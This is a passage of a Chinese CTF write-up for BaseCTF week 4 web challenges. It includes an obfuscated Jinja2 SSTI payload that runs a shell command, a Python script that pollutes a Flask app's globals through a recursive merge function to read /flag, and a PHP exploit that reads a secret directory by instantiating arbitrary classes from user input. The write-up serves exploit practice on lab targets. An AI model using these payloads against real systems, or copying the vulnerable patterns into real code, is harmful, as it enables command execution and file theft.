BaseCTF{%print(''['_''_cla''ss_''_']['_''_ba''se_''_']['_''_subcl''asses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']['cd $OLDPWD;cat flag']['re''ad']())%}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731822491307-f54972de-ffb4-4bb3-a5b6-f8e5079054ee.png)



# week4
## 圣钥之战1.0
### 考点：
**merge（）函数：**

**Python原型链污染：**[**参考文章**](https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7I7xiqY5QaTNmeD)

**主要原理还是通过 merge 函数往对象树里合并内容**

**这题的原理就是通过污染 __file__，再利用这个玩意，在/read 界面把 flag 爆出来**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731827711350-d6c03765-f397-406c-be3b-caf2cdb2b98e.png)

### 题解：
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731824278016-d689e685-623f-4393-85b4-e74b5dc756f8.png)

进入/read，看到 python 的 flask 框架，下面只列出关键部分

```python
def merge(src, dst):
    """
    这个函数的目的是将源字典（src）中的键值对合并到目标对象（dst）中。
    如果遇到源字典中的值也是字典类型，会递归地进行合并操作。

    参数：
    - src：源字典，包含要合并到目标对象中的键值对。
    - dst：目标对象，可以是字典或者具有属性的对象，用于接收源字典合并过来的内容。
    """
    for k, v in src.items():
        """
        遍历源字典src中的每一个键值对。
        k是键，v是对应的值。
        """
        if hasattr(dst, '__getitem__'):
            """
            检查目标对象dst是否具有通过键获取值的能力（类似字典的__getitem__方法）。
            这通常意味着dst可能是一个字典或者类似字典行为的对象。
            """
            if dst.get(k) and type(v) == dict:
                """
                如果目标对象dst中已经存在键k对应的键值对，并且当前源字典中的值v是一个字典类型，
                那么就需要递归地调用merge函数，将v这个字典与dst中键k对应的字典进行进一步的合并操作。
                """
                merge(v, dst.get(k))
            else:
                dst[k] = v
                """
                如果目标对象dst中不存在键k对应的键值对，或者当前源字典中的值v不是字典类型，
                那么就直接将源字典中的键值对（k, v）添加到目标对象dst中。
                """
        elif hasattr(dst, k) and type(v) == dict:
            """
            如果目标对象dst不具有通过键获取值的能力（不类似字典的__getitem__方法），
            但是具有名为k的属性，并且当前源字典中的值v是一个字典类型，
            那么就需要递归地调用merge函数，将v这个字典与dst的属性k对应的对象进行进一步的合并操作。
            这里通过getattr函数获取dst的属性k对应的对象。
            """
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
            """
            如果以上条件都不满足，即目标对象dst既不具有通过键获取值的能力，
            也不存在名为k的属性，或者当前源字典中的值v不是字典类型，
            那么就直接通过setattr函数将源字典中的键值对（k, v）设置为目标对象dst的属性。
            """
```

```python
from flask import Flask, request
import json

app = Flask(__name__)

# 定义了一个路由，路径为'/pollute'，并且支持GET和POST两种请求方法
@app.route('/pollute', methods=['GET', 'POST'])  
def Pollution():
    # 判断接收到的请求是否是JSON格式的数据
    if request.is_json:  
# 如果是JSON格式，就调用merge函数（这里假设merge函数已定义且在当前作用域可调用），将解析后的请求数据（通过json.loads将JSON字符串转换为Python对象）和instance（这里应该是一个事先定义好的对象，可能用于存储某种状态或数据）进行合并操作
        merge(json.loads(request.data), instance) 
    else:
        # 如果接收到的请求不是JSON格式，就返回这条提示信息
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"  
    # 如果成功执行了前面的merge操作（即请求是JSON格式且merge函数执行无误），就返回这条提示信息"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"  
```

编写脚本

```python
import requests
import json

# 构造污染原型链的 JSON 请求
payload = {
    "__init__": {
        "__globals__": {
            "__file__": "/flag"
        }
    }
}

# 将 payload 转换为 JSON 字符串
json_payload = json.dumps(payload)

# 发送 POST 请求到 /pollute 路由
response = requests.post(
    "http://gz.imxbt.cn:20516/pollute",
    data=json_payload,
    headers={"Content-Type": "application/json"}
)

# 打印响应
print(response.text)

url2 = "http://gz.imxbt.cn:20516/read"
response2 = requests.get(url2)
print(response2.text)
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731827989087-3670d240-f849-4a17-87a8-696d008722a0.png)

## flag直接读取不就行了？
### 考点：
**PHP 的 DirectoryIterator 类：**[**参考文章**](about:blank)

**即通过这个迭代器类来获取目录下的文件信息**

**  PHP 的 SplFileObject类  ：**[**参考文章**](about:blank)

**用法：SplFileObject（文件路径）**

### 题解：
```php
<?php
  highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
  echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

 K、W是通过POST方式请求并且是通过类的方式创建了一个对象dir  
K：可以通过查询php文档找遍历的类。选择**DirectoryIterator**  
W:一般就先访问根目录 传入 ”/secret“ 

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731829419721-25808622-9a21-42b7-8a97-b448e2073f2b.png)

接下来就是读取文件内容

 J 写入**SplFileObject **类，H 写入文件路径

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731830029394-5796494e-5f7b-488d-8bbb-5dc336ac118f.png)

之后我们没发现 flag，应该是在注释里

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731830075345-0c83cdbc-ce27-4d45-b708-3193e4cf4a86.png)

结束

